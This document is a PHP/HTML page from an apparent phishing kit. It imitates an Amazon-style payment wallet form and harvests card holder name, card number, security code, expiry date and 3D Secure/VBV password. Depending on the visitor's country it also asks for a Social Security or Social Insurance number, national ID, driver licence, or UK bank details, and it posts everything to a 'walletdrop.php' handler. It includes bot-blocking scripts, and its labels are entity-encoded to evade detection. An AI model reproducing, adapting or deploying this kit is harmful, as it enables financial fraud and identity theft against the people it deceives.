<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include('../banned.php');?>
<!-- HTML INPUTS FOR WALLET PAGE -->
<!-- CODE STARTS HERE -->
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<form  onsubmit="return Validate(this);" action="walletdrop.php?cmd=_update-information&account_card=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>" method="post">		
  <?php  ################################################################################################################################### ?>
  <label for="cc_holder" class="a-size-base a-text-bold">&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x6F;&#x6E;&#x20;&#x63;&#x61;&#x72;&#x64;:
  </label>
  <input type="text" maxlength="30" required="" autocomplete="off" id="cc_holder" value="" size="24" onkeydown="upperCaseF(this)" title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x6E;&#x61;&#x6D;&#x65;" placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x6E;&#x61;&#x6D;&#x65;" name="cc_holder" >
  <br>
  <span id="pmts-id-11">
  </span>
  <?php  ################################################################################################################################### ?>
  <div class="a-row a-spacing-top-base">
    <ul class="a-nostyle a-horizontal a-spacing-none">
      <li>
        <span class="a-list-item">
          <label for="cc_number" >&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;:
          </label>
        </span>
      </li>
    </ul>
    <input type="text" id="cc_number" placeholder="&#x58;&#x58;&#x58;&#x58;&#x20;&#x58;&#x58;&#x58;&#x58;&#x20;&#x58;&#x58;&#x58;&#x58;&#x20;&#x58;&#x58;&#x58;&#x58;" title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" autocomplete="off" required="" pattern="[2-7][0-9 ]{11,24}" maxlength="30" onkeyup="type_carte()" name="cc_number" size="20">
    <br>
    <span id="pmts-id-11">
    </span>
    <?php  ################################################################################################################################### ?>
    <div class="a-row a-spacing-top-base">
      <ul class="a-nostyle a-horizontal a-spacing-none">
        <li>
          <label for="cvv2_number" class="a-size-base a-text-bold">&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x43;&#x6F;&#x64;&#x65;:
          </label>
        </li>
      </ul>
      <input type="text" id="cvv2_number" required="" autocomplete="off" pattern="[0-9]{3,4}" title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x43;&#x6F;&#x64;&#x65; " placeholder="&#x43;&#x56;&#x56;&sol;&#x43;&#x56;&#x56;&#x32;" maxlength="4" name="cvv2_number" size="7">
      <br>
      <span id="pmts-id-11">
      </span>
      <?php  ################################################################################################################################### ?>
      <script type="text/javascript">
        function ExpiryDate() {
          var year = document.getElementById("TH3MRXYEAR").value;
          var month = document.getElementById("TH3MRXMONTH").value;
          today = new Date();
          expiry = new Date(year, month);
          if (today.getTime() > expiry.getTime())
            return false;
          else
            return true;
        };
      </script>
      <?php  ################################################################################################################################### ?>
      <div class="a-row a-spacing-top-base">
        <ul class="a-nostyle a-horizontal a-spacing-none">
          <li>
            <label class="a-size-base a-text-bold">&#x45;&#x78;&#x70;&#x69;&#x72;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x64;&#x61;&#x74;&#x65;:
            </label>
          </li>
        </ul>
        <span>
          <span class="a-button a-button-dropdown" style="width: 50px;">
            <span class="a-button-inner">
              <select name="TH3MRXMONTH" id="TH3MRXMONTH" autocomplete="off" required="required" style="width: 75px;" class="a-button-text a-declarative" >
                <option value="<?php  echo date("m");?>" selected="">
                  <?php  echo date("m");?>
                </option>
                <option value="">
                </option>
                <option value="01">01
                </option>
                <option value="02">02
                </option>
                <option value="03">03
                </option>
                <option value="04">04
                </option>
                <option value="05">05
                </option>
                <option value="06">06
                </option>
                <option value="07">07
                </option>
                <option value="08">08
                </option>
                <option value="09">09
                </option>
                <option value="10">10
                </option>
                <option value="11">11
                </option>
                <option value="12">12
                </option>
              </select>
              <i class="a-icon a-icon-dropdown">
              </i>
            </span>
          </span>
        </span>
        <span class="a-letter-space">
        </span>
        <span>
          <span class="a-button a-button-dropdown" style="width: 70px;">
            <span class="a-button-inner">
              <?php  ################################################################################################################################### ?>
              <select name="TH3MRXYEAR" id="TH3MRXYEAR" autocomplete="off" required="required" style="width: 90px;" class="a-button-text a-declarative" >
                <option value="<?php  echo date("Y");?>" selected="">
                  <?php  echo date("Y");?>
                </option>
                <option value="">
                </option>
                <option value="2017">2017
                </option>
                <option value="2018">2018
                </option>
                <option value="2019">2019
                </option>
                <option value="2020">2020
                </option>
                <option value="2021">2021
                </option>
                <option value="2022">2022
                </option>
                <option value="2023">2023
                </option>
                <option value="2024">2024
                </option>
                <option value="2025">2025
                </option>
                <option value="2026">2026
                </option>
                <option value="2027">2027
                </option>
                <option value="2028">2028
                </option>
                <option value="2029">2029
                </option>
                <option value="2030">2030
                </option>
                <option value="2031">2031
                </option>
              </select>
              <i class="a-icon a-icon-dropdown">
              </i>
            </span>
          </span>
        </span>
        <?php  ################################################################################################################################### ?>
        <script>
          function type_carte(){
            var get_value = document.getElementById('cc_number').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
              document.getElementById("cvv2_number").maxLength ="3"
            }
            else if(other == "5"){
              document.getElementById("cvv2_number").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
              document.getElementById('th3mrx').style.display ="none"
              document.getElementById("cvv2_number").maxLength ="4"
            }
            else if(type == "37"){
              document.getElementById('th3mrx').style.display ="none"
              document.getElementById("cvv2_number").maxLength ="4"
            }
            /*End Amex Card*/
            /*blue Card*/
            else if(type == "30"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else if(type == "36"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else if(type == "38"){
              document.getElementById('th3mrx').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else if(type == "35"){
              document.getElementById('th3mrx').style.display ="none"
            }
            else{
              document.getElementById('th3mrx').style.display ="block"
            }
          };
        </script>
        <div id="th3mrx" class="a-row a-spacing-top-base">
          <ul class="a-nostyle a-horizontal a-spacing-none">
            <li>
              <span class="a-list-item">
                <label for="pmts-id-12" class="a-size-base a-text-bold">&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x33;&#x44;&sol;&#x56;&#x42;&#x56;:
                </label>
              </span>
            </li>
          </ul>
          <input type="password" id="vbv" autocomplete="off" maxlength="30" placeholder="&#x33;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&sol;&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;" name="vbv" class="a-input-text a-width-medium">
          <img src="../data/icon/vbv_mcsc_medium_nobg.gif" style="width:100px;height:30px;">
          <br>
          <span id="pmts-id-13">
          </span>
        </div>
        <?php  ################################################################################################################################### ?>
<script src="../data/js/jquery.js" type="text/javascript"></script><script src="../data/js/jquery.min.mask.js" type="text/javascript"></script><script src="../data/js/jquery.maskedinput.js" type="text/javascript"></script>
<script type="text/javascript">
          jQuery(function($){
            $("#ssn").mask("999-99-9999");
            $("#sortcode").mask("99-99-99");
            $("#sin").mask("999-99-9999");
            $("#an").mask("99999999");
          }
                );
</script>				
        <?php  
// SHOW SOCIAL SEC NUMBER ONLY IF COUNTRY IS USA OR ISRAEL
if ($COUNTRYCODE=="US" or $COUNTRYCODE=="IL"){ echo '
<div class="a-row a-spacing-top-base"><ul class="a-nostyle a-horizontal a-spacing-none"><li>
<span class="a-list-item"><label for="pmts-id-12" class="a-size-base a-text-bold">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;:</label></span>
</li></ul>
<input type="tel" placeholder="&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" id="ssn" required="required" name="ssn" class="ssn">
<br><span id="pmts-id-13"></span></div>
';}
// SHOW SOCIAL INSURANCE NUMBER ONLY IF COUNTRY IS CANADA
elseif ($COUNTRYCODE=="CA"){ echo '
<div class="a-row a-spacing-top-base"><ul class="a-nostyle a-horizontal a-spacing-none"><li>
<span class="a-list-item"><label for="pmts-id-12" class="a-size-base a-text-bold">S&omicron;cial &#x49;&#x6E;&#x73;&#x75;&#x72;&#x61;&#x6E;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;:</label></span>
</li></ul>
<input type="tel" placeholder="S&omicron;cial &#x49;&#x6E;&#x73;&#x75;&#x72;&#x61;&#x6E;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" required="required" id="sin" name="sin" class="sin">
<br><span id="pmts-id-13"></span></div>
';}
// SHOW NATIONAL ID NUMBER ONLY IF COUNTRY IS HONGKONG
elseif ($COUNTRYCODE=="HK") { echo '
<div class="a-row a-spacing-top-base"><ul class="a-nostyle a-horizontal a-spacing-none"><li>
<span class="a-list-item"><label for="pmts-id-12" class="a-size-base a-text-bold">Nati&omicron;nal &Iota;D &Nu;umber:</label></span>
</li></ul>
<input type="tel" maxlength="25" placeholder="Nati&omicron;nal &Iota;D &Nu;umber" required="required" id="nin" name="nin" class="nin">
<br><span id="pmts-id-13"></span></div>
';}
// SHOW DRIVER LICENCE NUMBER ONLY IF COUNTRY IS AUSTRALIA
elseif ($COUNTRYCODE=="AU") { echo '
<div class="a-row a-spacing-top-base"><ul class="a-nostyle a-horizontal a-spacing-none"><li>
<span class="a-list-item"><label for="pmts-id-12" class="a-size-base a-text-bold">&#x44;&#x72;&#x69;&#x76;&#x65;&#x72;&#x20;&#x4C;&#x69;&#x63;&#x65;&#x6E;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;:</label></span>
</li></ul>
<input type="tel" maxlength="20" placeholder="&#x44;&#x72;&#x69;&#x76;&#x65;&#x72;&#x20;&#x4C;&#x69;&#x63;&#x65;&#x6E;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" id="dln" name="dln" required="required" class="dln">
<br><span id="pmts-id-13"></span></div>
';}
// SHOW SORTCODE + ACCOUNT NUMBER ONLY IF COUNTRY IS UNITED KINGDOM
elseif ($COUNTRYCODE=="GB"){ echo '
<div class="a-row a-spacing-top-base"><ul class="a-nostyle a-horizontal a-spacing-none"><li>
<span class="a-list-item"><label for="pmts-id-12" class="a-size-base a-text-bold">&#x53;&#x6F;&#x72;&#x74;&#x20;&#x43;&#x6F;&#x64;&#x65;:</label></span>
</li></ul>
<input type="tel" placeholder="&#x53;&#x6F;&#x72;&#x74;&#x20;&#x43;&#x6F;&#x64;&#x65;" id="sortcode" required="required" name="sortcode" class="sortcode">
<br><span id="pmts-id-13"></span></div>
<div class="a-row a-spacing-top-base"><ul class="a-nostyle a-horizontal a-spacing-none"><li>
<span class="a-list-item"><label for="pmts-id-12" class="a-size-base a-text-bold">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;:</label></span>
</li></ul>
<input type="tel" placeholder="&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" required="required" id="an" name="an" class="an">
<br><span id="pmts-id-13"></span></div>
';}
?>
        <?php  ################################################################################################################################### ?>
        <div class="a-box a-spacing-top-base a-width-large pmts_box_without_border">
          <div class="a-box-inner a-padding-none">
            <span class="a-button pmts-add-credit-card-form-in-list-cancel">
              <span class="a-button-inner">
                <button class="a-button-text">&#x53;&#x61;&#x76;&#x65;</button>
              </span>
            </span>
            <span id="pmts-id-22" class="a-button a-button-primary">
              <span class="a-button-inner">
                <button class="a-button-text" id="submit" type="submit">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x65; &amp; &#x41;&#x63;&#x74;&#x69;&#x76;&#x61;&#x74;&#x65;
                </button>
                <div id="x-list-item">
                </div>
              </span>
            </span>
          </div>
        </div>
        </form>
      <!-- CODE ENDS HERE -->
